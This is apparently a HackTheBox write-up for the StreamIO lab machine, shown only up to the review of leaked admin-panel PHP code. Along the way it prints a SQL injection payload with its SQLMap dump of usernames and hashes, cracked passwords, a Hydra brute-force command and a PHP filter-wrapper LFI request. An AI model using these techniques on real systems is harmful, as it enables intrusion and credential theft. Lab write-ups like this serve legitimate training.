---
title: "HTB: StreamIO"
date: 2026-06-16
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "SQL Injection","LFI", "RCE", "SQLCMD","BloodHound", "LDAP", "Group Membership Abuse", "LAPS"]
categories: ["Writeups"]
description: "StreamIO involves subdomain enumeration, SQL injection, credential extraction and cracking, LFI, remote code execution, SQL Server enumeration, credential recovery, Active Directory group manipulation, and LAPS password disclosure to achieve full domain compromise.."
---

# 🚩 Box Name: StreamIO

## 📋 Initial Info
- **Hostname:** `streamIO.htb`

StreamIO is a medium-difficulty Windows machine that showcases how a series of seemingly small weaknesses can be chained together into a full domain compromise. The attack begins with subdomain enumeration, which uncovers a hidden application vulnerable to SQL injection. Exploiting this flaw allows us to extract user credentials from the backend database, crack them offline, and gain access to the site's administration portal.

Once inside the admin panel, I discover a Local File Inclusion (LFI) vulnerability that exposes the application's source code. Digging through the code reveals an additional file inclusion flaw that can be abused to achieve remote code execution and obtain an initial foothold on the target system.

After landing a shell, the focus shifts to internal enumeration. Using SQLCMD, I explore the backend databases and uncover additional credentials that facilitate lateral movement to another user account. From there, system enumeration with WinPEAS reveals stored browser credential databases containing yet another set of secrets waiting to be recovered.

With these new credentials in hand, BloodHound highlights an interesting privilege path within Active Directory. Although direct access to a privileged account is unavailable, the compromised user has the ability to modify their own group memberships. By abusing this permission through PowerShell, I add myself to the Core Staff group and gain access to sensitive LDAP data. This ultimately leads to the disclosure of the administrator's LAPS password, providing full control of the target environment.

StreamIO is an excellent example of how enumeration, credential hunting, Active Directory misconfigurations, and application-layer vulnerabilities can be combined to turn a low-privileged foothold into complete system compromise.


---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

#### Scan

```shell
Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-16 11:17 CDT
Nmap scan report for 10.129.13.230
Host is up (0.062s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 23:19:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-06-16T23:21:14+00:00; +7h00m00s from scanner time.
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
59222/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-16T23:20:34
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   63.83 ms 10.10.14.1
2   63.90 ms 10.129.13.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### 🌐 Web Enumeration

After spending some time poking around the Windows services, nothing immediately jumped out as a straightforward attack path. Rather than forcing the issue, I shifted my attention to the web services running on ports **80** and **443**.

The initial Nmap scan had already given me a useful clue. The SSL certificate revealed two hostnames:

- `streamio.htb`

- `watch.streamio.htb`


I added both to my `/etc/hosts` file and started digging deeper. Since the target was also running DNS, I queried it directly for additional records.

Using `dig`, I discovered another hostname: 

- `dc.streamio.htb`

Since it pointed back to the target, I added that one as well. It's always worth checking DNS on Windows targets—you never know when it will casually hand you another breadcrumb.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ dig any streamio.htb @10.129.13.230                                                                                                                                       ──(Tue,Jun16)─┘

; <<>> DiG 9.20.23-1~deb13u1-Debian <<>> any streamio.htb @10.129.13.230
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53170
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamio.htb.                  IN      ANY

;; ANSWER SECTION:
streamio.htb.           600     IN      A       10.129.13.230
streamio.htb.           3600    IN      NS      dc.streamio.htb.
streamio.htb.           3600    IN      SOA     dc.streamio.htb. hostmaster.streamio.htb. 293 900 600 86400 3600
streamio.htb.           600     IN      AAAA    dead:beef::d90:68bd:df0d:887b
streamio.htb.           600     IN      AAAA    dead:beef::17a

;; ADDITIONAL SECTION:
dc.streamio.htb.        3600    IN      A       10.129.13.230
dc.streamio.htb.        3600    IN      AAAA    dead:beef::17a
dc.streamio.htb.        3600    IN      AAAA    dead:beef::d90:68bd:df0d:887b

;; Query time: 61 msec
;; SERVER: 10.129.13.230#53(10.129.13.230) (TCP)
;; WHEN: Tue Jun 16 11:27:21 CDT 2026
;; MSG SIZE  rcvd: 249
```





#### 80

Port 80 turned out to be fairly boring. Visiting both `streamio.htb` and `watch.streamio.htb` simply displayed default IIS content with nothing particularly exciting.

To make sure there weren't any hidden directories lurking beneath the surface, I ran some directory brute-forcing with FFUF.

The results were underwhelming:

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://streamIO.htb/FUZZ                                             ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 80ms]
:: Progress: [26583/26583] :: Job [1/1] :: 651 req/sec :: Duration: [0:00:45] :: Errors: 1 ::
```


```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://watch.streamIO.htb/FUZZ                                       ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://watch.streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 301, Size: 163, Words: 9, Lines: 2, Duration: 63ms]
:: Progress: [26583/26583] :: Job [1/1] :: 390 req/sec :: Duration: [0:00:47] :: Errors: 1 ::
```

And that's about it.

With nothing useful on port 80, I moved on to HTTPS.

#### 443

Port 443 was much more promising.

The site was running:

- Microsoft IIS 10.0
- PHP 7.2.26
- Microsoft SQL Server on the backend

That's already a more interesting attack surface than a plain IIS landing page.

**StreamIO.htb**

The main site contained several pages and functionality that looked like a typical streaming platform.

![Site 1](/images/streamio/site1.png)

Running FFUF against the root directory uncovered a few interesting locations. I used the lowercase wordlist since this is a Windows server and it doesn't require case specifically.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://streamIO.htb/FUZZ                                            ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 65ms]
images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 69ms]
css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 64ms]
js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 65ms]
fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 66ms]
:: Progress: [26583/26583] :: Job [1/1] :: 583 req/sec :: Duration: [0:00:46] :: Errors: 1 ::
```


The presence of an `/admin` directory immediately earned a spot on my list of things to investigate later.

Since the application was using PHP, I performed another round of fuzzing using the `.php` extension.

This revealed several additional pages.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://streamIO.htb/FUZZ.php                                        ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
contact                 [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 111ms]
register                [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 108ms]
about                   [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 67ms]
login                   [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 389ms]
index                   [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 75ms]
:: Progress: [26583/26583] :: Job [1/1] :: 554 req/sec :: Duration: [0:00:44] :: Errors: 1 ::
```


One page stood out in particular: `about.php`.

While browsing through the `about` section, I found what appeared to be staff names and employee information. These aren't credentials, but potential usernames. Whenever I see real names exposed on a site, I add them to a username list for later use.


![About](/images/streamio/about.png)



**watch.StreamIO.htb**


The second virtual host was considerably more interesting.

![Site 2](/images/streamio/site2.png)


After some enumeration, I discovered three PHP endpoints.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://watch.streamIO.htb/FUZZ.php                                  ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamIO.htb/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 79ms]
search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 276ms]
blocked                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 60ms]
:: Progress: [26583/26583] :: Job [1/1] :: 630 req/sec :: Duration: [0:00:43] :: Errors: 1 ::
```


The standout here was `search.php`.

At first glance it looked like a simple movie search feature. A quick look in Burp Suite revealed user input being passed directly to the backend, and after some testing it became clear that the page was vulnerable to SQL injection.

Unfortunately, this wasn't one of those friendly SQL injections that immediately falls apart when you throw `UNION SELECT` at it.

Most common payloads were blocked.

Even automated tooling such as SQLMap struggled here.

The injection is absolutely exploitable, but doing so requires a more manual approach. Since my goal for this box was primarily the Windows exploitation path for CPTS prep, I decided not to spend hours manually extracting data from this endpoint.

Instead, I kept enumerating which payed off.


![Search](/images/streamio/search.png)


Burp looksie.

![Burp](/images/streamio/burp1.png)


#### Finding another SQL Injection

While reviewing the application, I noticed something interesting about the login functionality on `streamio.htb`.

After some testing, I found another SQL injection point hiding inside `login.php`.

This one wasn't exactly fast, but unlike the search page injection, SQLMap was able to work with it.

I captured the login request and let SQLMap do its thing.

Then I went and did something highly technical, I went to sleep.

#### SQLMap Does the Night Shift

The next morning SQLMap had finally finished dumping the database.

The login page was vulnerable to a **stacked-query SQL injection**, allowing SQLMap to enumerate and extract data from the backend Microsoft SQL Server database.

Among the dumped tables was `STREAMIO.dbo.users`.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ sqlmap -r req.login.txt --dump -T users -D STREAMIO --level 5 --risk 3                                                                                                    ──(Tue,Jun16)─┘
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:59:27 /2026-06-16/

[13:59:27] [INFO] parsing HTTP request from 'req.login.txt'
[13:59:27] [INFO] resuming back-end DBMS 'microsoft sql server'
[13:59:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=oliver';WAITFOR DELAY '0:0:5'--&password=pass
---
[13:59:29] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 11 or 2019 or 2022 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[13:59:29] [INFO] fetching columns for table 'users' in database 'STREAMIO'
[13:59:29] [INFO] resumed: 4
[13:59:29] [INFO] resumed: id
[13:59:29] [INFO] resumed: is_staff
[13:59:29] [INFO] resumed: password
[13:59:29] [INFO] resumed: username
[13:59:29] [INFO] fetching entries for table 'users' in database 'STREAMIO'
[13:59:29] [INFO] fetching number of entries for table 'users' in database 'STREAMIO'
<SNIP>
[06:33:37] [INFO] retrieved: bob
Database: STREAMIO
Table: users
[31 entries]
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 3  | 1        | c660060492d9edcaa8332d89c99c9239                   | James                                              |
| 4  | 1        | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |
| 5  | 1        | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |
| 6  | 1        | 08344b85b329d7efd611b7a7743e8a09                   | Lauren                                             |
| 7  | 1        | d62be0dc82071bccc1322d64ec5b6c51                   | William                                            |
| 8  | 1        | f87d3c0d6c8fd686aacc6627f1f493a5                   | Sabrina                                            |
| 9  | 1        | f03b910e2bd0313a23fdd7575f34a694                   | Robert                                             |
| 10 | 1        | 3577c47eb1e12c8ba021611e1280753c                   | Thane                                              |
| 11 | 1        | 35394484d89fcfdb3c5e447fe749d213                   | Carmon                                             |
| 12 | 1        | 54c88b2dbd7b1a84012fabc1a4c73415                   | Barry                                              |
| 13 | 1        | fd78db29173a5cf701bd69027cb9bf6b                   | Oliver                                             |
| 14 | 1        | b83439b16f844bd6ffe35c02fe21b3c0                   | Michelle                                           |
| 15 | 1        | 0cfaaaafb559f081df2befbe66686de0                   | Gloria                                             |
| 16 | 1        | b22abb47a02b52d5dfa27fb0b534f693                   | Victoria                                           |
| 17 | 1        | 1c2b3d8270321140e5153f6637d3ee53                   | Alexendra                                          |
| 18 | 1        | 22ee218331afd081b0dcd8115284bae3                   | Baxter                                             |
| 19 | 1        | ef8f3d30a856cf166fb8215aca93e9ff                   | Clara                                              |
| 20 | 1        | 3961548825e3e21df5646cafe11c6c76                   | Barbra                                             |
| 21 | 1        | ee0b8a0937abd60c2882eacb2f8dc49f                   | Lenord                                             |
| 22 | 1        | 0049ac57646627b8d7aeaccf8b6a936f                   | Austin                                             |
| 23 | 1        | 8097cedd612cc37c29db152b6e9edbd3                   | Garfield                                           |
| 24 | 1        | 6dcd87740abb64edfa36d170f0d5450d                   | Juliette                                           |
| 25 | 1        | bf55e15b119860a6e6b5a164377da719                   | Victor                                             |
| 26 | 1        | 7df45a9e3de3863807c026ba48e55fb3                   | Lucifer                                            |
| 27 | 1        | 2a4e2cf22dd8fcb45adcb91be1e22ae8                   | Bruno                                              |
| 28 | 1        | ec33265e5fc8c2f1b0c137bb7b3632b5                   | Diablo                                             |
| 29 | 1        | dc332fb5576e9631c9dae83f194f8e70                   | Robin                                              |
| 30 | 1        | 384463526d288edcc95fc3701e523bc7                   | Stan                                               |
| 31 | 1        | b779ba15cedfd22a023c4d8bcf5f2332                   | yoshihide                                          |
| 33 | 0        | 665a50ac9eaa781e4f7f04199db97a11                   | admin                                              |
| 34 | 0        | 42f749ade7f9e195bf475f37a44cafcb                   | bob                                                |
+----+----------+----------------------------------------------------+----------------------------------------------------+

[06:45:39] [INFO] table 'STREAMIO.dbo.users' dumped to CSV file '/home/split/.local/share/sqlmap/output/streamio.htb/dump/STREAMIO/users.csv'
[06:45:39] [INFO] fetched data logged to text files under '/home/split/.local/share/sqlmap/output/streamio.htb'

[*] ending @ 06:45:39 /2026-06-17/
```


Inside were 31 usernames and password hashes.

The usernames included both staff accounts and regular users, giving me a substantial target list for password attacks.

The passwords were stored as MD5 hashes, which is always nice to see from an attacker's perspective and slightly horrifying from a defender's perspective.

I extracted the hashes into a separate file and prepared them for cracking.

#### Cracking Passwords

With the hashes in hand, I turned to John the Ripper.

Using the classic `rockyou.txt` wordlist, John quickly recovered several passwords.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5                                                                                         1 ↵ ──(Tue,Jun16)─┘
Using default input encoding: UTF-8
Loaded 30 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (?)
physics69i       (?)
paddpadd         (?)
66boysandgirls.. (?)
%$clara          (?)
$monique$1991$   (?)
$hadoW           (?)
$3xybitch        (?)
##123a8j8w5123## (?)
!?Love?!123      (?)
!5psycho8!       (?)
!!sabrina$       (?)
12g 0:00:00:00 DONE (2026-06-16 14:58) 16.00g/s 19124Kp/s 19124Kc/s 525821KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```


At this point I have a large username list and multiple cracked passwords.

#### Credential Spraying

My first attempt involved password spraying against Windows services using NetExec.

Unfortunately, that didn't produce any valid domain credentials.

No problem.

The target had web logins too.

I fed my username and password lists into Hydra and pointed it at the login form.

A few seconds later Hydra came back with a winner.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ hydra -L users -P passwords streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"                                                      ──(Tue,Jun16)─┘
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-16 15:07:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 372 login tries (l:31/p:12), ~24 tries per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-16 15:07:21
```

Success.

Creds:
`yoshihide:66boysandgirls..`

I was now able to login to `streamIO.htb/admin`.

I now had access to the administrative panel.

### Admin Panel Exploration to LFI

Once inside the admin panel, I started clicking around and paying close attention to URL parameters.


![Admin](/images/streamio/admin.png)


One parameter immediately caught my attention.


![LFI Parameter](/images/streamio/LFIparameter.png)


Parameters like this are always worth investigating. In PHP applications, they're often used to dynamically load pages, and when developers get a little too trusting with user input, Local File Inclusion (LFI) vulnerabilities tend to appear.

I tried a few common LFI payloads without much success. Rather than continuing to guess blindly, I decided to take a more systematic approach and fuzz for additional parameters.

Using FFUF, I replaced the parameter name with the `FUZZ` keyword and searched for anything interesting.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u "https://streamIO.htb/admin/?FUZZ=" -b 'PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1' -fs 1678             ──(Tue,Jun16)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Header           : Cookie: PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 73ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 231ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 79ms]
user                    [Status: 200, Size: 2444, Words: 208, Lines: 75, Duration: 65ms]
:: Progress: [20481/20481] :: Job [1/1] :: 6 req/sec :: Duration: [0:06:47] :: Errors: 37 ::
```


`debug` immediately stood out. Whenever I see a parameter named `debug`, my curiosity level instantly jumps from "interested" to "extremely interested."

Developers rarely create debug functionality with attackers in mind.

#### Finding Interesting Files

Before attempting additional LFI payloads, I needed to know what files actually existed inside the `/admin` directory.

There's not much point trying to include random files if you don't know their names.

A quick round of directory fuzzing revealed two PHP files.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "https://streamIO.htb/admin/FUZZ.php" -b 'PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamIO.htb/admin/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Header           : Cookie: PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 1678, Words: 85, Lines: 50, Duration: 80ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 71ms]
:: Progress: [26583/26583] :: Job [1/1] :: 641 req/sec :: Duration: [0:00:42] :: Errors: 1 ::
```


`master.php` immediately looked suspicious.

The filename sounded important, and important files tend to contain interesting code.

Now I have a target.

#### Reading Source Code Through LFI

Since the application was built with PHP, I used a classic trick to retrieve source code without having the server execute it.

Instead of requesting the file directly, I used PHP's built-in filter wrapper.

```http
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```


The `convert.base64-encode` filter tells PHP to return the contents of the file as Base64 instead of executing it.

The result was a giant blob of encoded text.

Which was exactly what I wanted.

After decoding the output locally, I was rewarded with the full source code for `master.php`.

![LFI Exploit](/images/streamio/LFIexploit.png)


Quick and dirty decoding.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ echo 'PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5I
<SNIP>
4LnBocCIgKSANCmV2YWNsdWRlJ10pKTsNCmVsc2U0gIik7DQp9DQo/Pg==' | base64 -d
```


#### Examining master.php

At first glance, the file looked fairly ordinary. It contained code responsible for managing Movies, Staff accounts, User accounts. The page displayed lists of users and movies while also providing functionality to delete records from the database.

```php
<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
